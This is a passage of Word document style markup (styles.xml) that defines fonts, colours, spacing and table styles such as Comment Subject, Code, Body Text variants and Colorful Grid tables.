      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="PlaceholderText">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Address">
    <w:name w:val="Address"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Heading3nonum">
    <w:name w:val="Heading 3 nonum"/>
    <w:basedOn w:val="Heading3"/>
    <w:next w:val="BodyText"/>
    <w:uiPriority w:val="12"/>
    <w:qFormat/>
    <w:rsid w:val="00434086"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="LightList-Accent3">
    <w:name w:val="Light List Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="61"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A7A8B0" w:themeFill="accent3"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="double" w:sz="6" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="TableProfessional">
    <w:name w:val="Table Professional"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>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ode">
    <w:name w:val="Code"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Classsification">
    <w:name w:val="Classsification"/>
    <w:basedOn w:val="BodyText"/>
    <w:semiHidden/>
    <w:rsid w:val="00902F3F"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:caps/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Date">
    <w:name w:val="Date"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="DateChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DateChar">
    <w:name w:val="Date Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Date"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Documentinfopageheading">
    <w:name w:val="Document info page heading"/>
    <w:basedOn w:val="Heading3nonum"/>
    <w:next w:val="BodyText"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:before="360" w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="111111">
    <w:name w:val="Outline List 2"/>
    <w:basedOn w:val="NoList"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="10"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="1ai">
    <w:name w:val="Outline List 1"/>
    <w:basedOn w:val="NoList"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="11"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading7Char">
    <w:name w:val="Heading 7 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading7"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="3185BA" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading8Char">
    <w:name w:val="Heading 8 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading8"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="3185BA" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading9Char">
    <w:name w:val="Heading 9 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading9"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="3185BA" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="ArticleSection">
    <w:name w:val="Outline List 3"/>
    <w:basedOn w:val="NoList"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="12"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Bibliography">
    <w:name w:val="Bibliography"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="37"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BlockText">
    <w:name w:val="Block Text"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="2" w:space="10" w:color="68727B" w:themeColor="accent1" w:frame="1"/>
        <w:left w:val="single" w:sz="2" w:space="10" w:color="68727B" w:themeColor="accent1" w:frame="1"/>
        <w:bottom w:val="single" w:sz="2" w:space="10" w:color="68727B" w:themeColor="accent1" w:frame="1"/>
        <w:right w:val="single" w:sz="2" w:space="10" w:color="68727B" w:themeColor="accent1" w:frame="1"/>
      </w:pBdr>
      <w:ind w:left="1152" w:right="1152"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyText2">
    <w:name w:val="Body Text 2"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyText2Char"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120" w:line="480" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyText2Char">
    <w:name w:val="Body Text 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyText2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyText3">
    <w:name w:val="Body Text 3"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyText3Char"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyText3Char">
    <w:name w:val="Body Text 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyText3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextFirstIndent">
    <w:name w:val="Body Text First Indent"/>
    <w:basedOn w:val="BodyText"/>
    <w:link w:val="BodyTextFirstIndentChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:firstLine="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextFirstIndentChar">
    <w:name w:val="Body Text First Indent Char"/>
    <w:basedOn w:val="BodyTextChar"/>
    <w:link w:val="BodyTextFirstIndent"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent">
    <w:name w:val="Body Text Indent"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextIndentChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextIndentChar">
    <w:name w:val="Body Text Indent Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyTextIndent"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextFirstIndent2">
    <w:name w:val="Body Text First Indent 2"/>
    <w:basedOn w:val="BodyTextIndent"/>
    <w:link w:val="BodyTextFirstIndent2Char"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="360" w:firstLine="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextFirstIndent2Char">
    <w:name w:val="Body Text First Indent 2 Char"/>
    <w:basedOn w:val="BodyTextIndentChar"/>
    <w:link w:val="BodyTextFirstIndent2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent2">
    <w:name w:val="Body Text Indent 2"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextIndent2Char"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="120" w:line="480" w:lineRule="auto"/>
      <w:ind w:left="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextIndent2Char">
    <w:name w:val="Body Text Indent 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="BodyTextIndent2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent3">
    <w:name w:val="Body Text Indent 3"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextIndent3Char"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F3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341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="33"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Closing">
    <w:name w:val="Closing"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="ClosingChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
      <w:ind w:left="4252"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ClosingChar">
    <w:name w:val="Closing Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Closing"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00B341CC"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid">
    <w:name w:val="Colorful Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="C4DFEF" w:themeFill="text1" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="8ABFE0" w:themeFill="text1" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="8ABFE0" w:themeFill="text1" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="text1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="text1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid-Accent1">
    <w:name w:val="Colorful Grid Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E0E2E5" w:themeFill="accent1" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C1C6CB" w:themeFill="accent1" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C1C6CB" w:themeFill="accent1" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4E555C" w:themeFill="accent1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4E555C" w:themeFill="accent1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid-Accent2">
    <w:name w:val="Colorful Grid Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="F8DAD2" w:themeFill="accent2" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F1B6A5" w:themeFill="accent2" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F1B6A5" w:themeFill="accent2" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A23919" w:themeFill="accent2" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A23919" w:themeFill="accent2" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid-Accent3">
    <w:name w:val="Colorful Grid Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="EDEDEF" w:themeFill="accent3" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="DBDCDF" w:themeFill="accent3" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
